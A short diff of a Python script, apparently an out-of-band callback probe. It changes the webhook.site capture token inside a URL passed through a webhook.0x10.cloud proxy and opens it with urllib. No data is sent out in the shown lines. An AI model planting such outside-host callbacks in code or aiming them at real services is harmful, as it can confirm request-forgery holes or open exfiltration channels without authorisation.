@@ -1,6 +1,6 @@
 import urllib.request
 
-target = "http://webhook.0x10.cloud/?url=https://webhook.site/e880f46f-049e-4cf3-b7da-073821af9f8e"
+target = "http://webhook.0x10.cloud/?url=https://webhook.site/fba40850-56bd-4fe0-8929-e348cdf168ed"
 
 try:
     with urllib.request.urlopen(target) as response:
